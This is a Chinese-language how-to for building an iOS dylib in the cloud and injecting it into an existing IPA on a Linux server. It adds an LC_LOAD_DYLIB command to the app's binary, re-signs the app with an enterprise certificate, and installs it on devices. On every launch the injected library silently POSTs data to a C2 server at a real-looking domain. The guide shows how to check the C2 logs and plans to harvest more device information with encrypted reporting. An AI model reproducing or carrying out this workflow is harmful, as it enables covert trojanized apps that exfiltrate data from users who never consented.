# 无 macOS 环境下的完整解决方案

## 概述

本方案使用 **GitHub Actions（免费）** 在云端 macOS 上编译 dylib，然后在 Linux 服务器上完成 IPA 修改。**无需本地 macOS**。

## 工作流程

```
┌─────────────────────────────────────────────────────────┐
│  Step 1: GitHub Actions 编译 dylib (云端 macOS)          │
│  - 推送代码到 GitHub                                     │
│  - 自动触发编译                                          │
│  - 下载编译好的 FlagReporter.dylib                        │
└────────────────────┬────────────────────────────────────┘
                     │ 下载 dylib
                     ▼
┌─────────────────────────────────────────────────────────┐
│  Step 2: Linux 服务器修改 IPA                            │
│  - 上传 dylib 到服务器                                   │
│  - 运行 repackage_ipa.py                                │
│  - 生成 patched.ipa                                     │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│  Step 3: 企业签名 + 安装                                 │
│  - 上传到签名平台                                        │
│  - 安装到设备                                            │
│  - 启动 App → 自动上报                                   │
└─────────────────────────────────────────────────────────┘
```

## 详细步骤

### Step 1: 使用 GitHub Actions 编译 dylib

#### 1.1 创建 GitHub 仓库

```bash
# 在本地创建临时目录
mkdir -p /tmp/flag_reporter_build
cd /tmp/flag_reporter_build

# 初始化 git 仓库
git init
git config user.name "Your Name"
git config user.email "your@email.com"

# 从服务器复制源文件
# (或使用 scp 从服务器下载)
scp -r root@your-server:/www/wwwroot/chain2/backend_c2/flag_report_dlib/* .

# 或者手动创建以下文件结构：
# flag_reporter_build/
# ├── FlagReporter.m          (dylib 源代码)
# └── .github/
#     └── workflows/
#         └── build-dylib.yml  (编译配置)
```

#### 1.2 推送到 GitHub

```bash
# 在 GitHub 上创建一个新仓库（例如：flag-reporter-dylib）
# 然后推送代码

git add .
git commit -m "Initial commit: FlagReporter dylib source"
git branch -M main
git remote add origin https://github.com/YOUR_USERNAME/flag-reporter-dylib.git
git push -u origin main
```

#### 1.3 触发编译

推送代码会自动触发 GitHub Actions 编译。也可以手动触发：

1. 打开仓库页面：`https://github.com/YOUR_USERNAME/flag-reporter-dylib`
2. 点击 **Actions** 标签
3. 选择 **Build iOS dylib** workflow
4. 点击 **Run workflow** → **Run workflow**

#### 1.4 下载编译好的 dylib

编译完成后（约 2-3 分钟）：

1. 在 Actions 页面找到成功的 workflow run
2. 在 **Artifacts** 部分点击 **FlagReporter-dylib**
3. 下载 `FlagReporter.dylib`

或者使用 GitHub CLI：

```bash
# 安装 GitHub CLI (如果未安装)
# https://cli.github.com/

# 下载 artifact
gh run download --repo YOUR_USERNAME/flag-reporter-dylib --name FlagReporter-dylib
```

### Step 2: 在 Linux 服务器上修改 IPA

#### 2.1 上传 dylib 到服务器

```bash
# 将下载的 dylib 上传到服务器
scp FlagReporter.dylib root@your-server:/www/wwwroot/chain2/backend_c2/flag_report_dlib/
```

#### 2.2 验证 dylib

```bash
# 在服务器上
cd /www/wwwroot/chain2/backend_c2/flag_report_dlib
ls -la FlagReporter.dylib
file FlagReporter.dylib
# 应显示: Mach-O 64-bit dynamically linked shared library arm64
```

#### 2.3 重打包 IPA

```bash
# 运行重打包脚本
python3 repackage_ipa.py \
    ~/Downloads/165454_plugin2.ipa \
    ~/Downloads/165454_patched.ipa \
    https://chain.8848exchange.cc.cd
```

脚本会自动：
1. 解压 IPA
2. 复制 `FlagReporter.dylib` 到 `Frameworks/`
3. 修改主二进制，添加 `LC_LOAD_DYLIB`
4. 写入 `flag` 文件
5. 清除签名
6. 重打包

#### 2.4 验证修改

```bash
# 解压检查
unzip -q ~/Downloads/165454_patched.ipa -d /tmp/check
cd /tmp/check/Payload/WebViewShell.app/Frameworks
ls -la FlagReporter.dylib  # 应存在

# 检查主二进制的 load commands
strings ../WebViewShell | grep FlagReporter
# 应显示: @executable_path/Frameworks/FlagReporter.dylib
```

### Step 3: 企业签名 + 安装

1. 将 `165454_patched.ipa` 上传到企业签名平台
2. 使用企业证书重签名
3. 下载安装到 iOS 设备
4. 启动 App

### Step 4: 验证上报

```bash
# 在服务器上查看 C2 日志
tail -f /www/wwwroot/chain2/backend_c2/c2.log

# 应看到类似输出：
# [HH:MM:SS] POST /report | UA=... | 156B
#   -> saved received/report_XXXXXXXX_HHMMSS_XXXX.bin (156 bytes)
```

查看设备日志（需要 macOS Console.app 或 Xcode）：

```
[FlagReporter] dylib loaded, starting flag report...
[FlagReporter] flag file read successfully, length: 156
[FlagReporter] Report URL: https://chain.8848exchange.cc.cd/report
[FlagReporter] Response status code: 200
```

## 文件清单

```
flag_report_dlib/
├── FlagReporter.m                      # dylib 源代码
├── inject_dylib.py                     # Mach-O 修改工具 (纯 Python)
├── repackage_ipa.py                    # IPA 重打包主脚本
├── inject_shellcode.py                 # LIEF 版本 (备选)
├── build_macos.sh                      # macOS 本地编译脚本 (备选)
├── README.md                           # 本地 macOS 方案说明
├── NO_MACOS_SOLUTION.md                # 本文档
└── .github/
    └── workflows/
        └── build-dylib.yml             # GitHub Actions 配置
```

## 故障排除

### GitHub Actions 编译失败

**错误**: `clang: error: no such file or directory: 'FlagReporter.m'`

**解决**: 确保 `FlagReporter.m` 在仓库根目录

**错误**: `error: 'Foundation/Foundation.h' file not found`

**解决**: 这是 GitHub Actions 环境问题，通常不会发生。如果发生，检查 workflow 配置中的 SDK 路径。

### dylib 注入失败

**错误**: `ERROR: 不是 64 位 Mach-O 文件`

**解决**: 确认 IPA 中的主二进制是 arm64 架构

**错误**: `ERROR: Dylib 文件不存在`

**解决**: 确认已将编译好的 dylib 上传到服务器

### App 启动后无上报

1. 检查 dylib 是否成功注入：
   ```bash
   unzip -q patched.ipa -d /tmp/check
   cd /tmp/check/Payload/WebViewShell.app/Frameworks
   ls -la FlagReporter.dylib
   ```

2. 查看设备日志（搜索 `[FlagReporter]`）

3. 确认网络可达：App 能访问 C2 域名

4. 确认 flag 文件存在：
   ```bash
   cat /tmp/check/Payload/WebViewShell.app/flag
   # 应显示: <blob>----6----<url>
   ```

### 签名问题

注入 dylib 后必须重签名。使用企业签名平台或：

```bash
# macOS 本地签名 (需要开发者证书)
codesign -f -s "iPhone Distribution: ..." \
    --preserve-metadata=entitlements \
    WebViewShell
```

## 替代方案

如果 GitHub Actions 不可用，可以考虑：

1. **朋友帮忙**: 找有 Mac 的朋友编译 dylib（运行 `build_macos.sh`）
2. **云 Mac 服务**: 使用 MacStadium、AWS EC2 Mac 实例（付费）
3. **在线编译服务**: 某些服务提供 iOS 编译功能（如 AppCenter）

## 技术细节

### dylib 加载机制

App 启动时，iOS dyld 解析 `LC_LOAD_DYLIB` 命令，自动加载 `@executable_path/Frameworks/FlagReporter.dylib`。dylib 的 `__attribute__((constructor))` 函数在加载时立即执行，读取 flag 文件并发送 HTTP POST 请求。

### Mach-O 修改原理

`inject_dylib.py` 直接操作 Mach-O 二进制文件：

1. 读取 `mach_header_64`，获取 load commands 信息
2. 构造新的 `dylib_command` 结构
3. 在 load commands 区域末尾插入新命令
4. 更新 header 中的 `ncmds` 和 `sizeofcmds`

### 为什么使用 GitHub Actions？

- **免费**: 公共仓库每月 2000 分钟免费额度
- **无需本地 Mac**: 云端 macOS 环境
- **自动化**: 推送代码自动编译
- **可重复**: 随时重新编译

## 后续扩展

修改 `FlagReporter.m` 后推送到 GitHub，会自动重新编译 dylib：

- 修改 POST 字段
- 添加更多设备信息
- 实现加密上报
- 添加重试机制
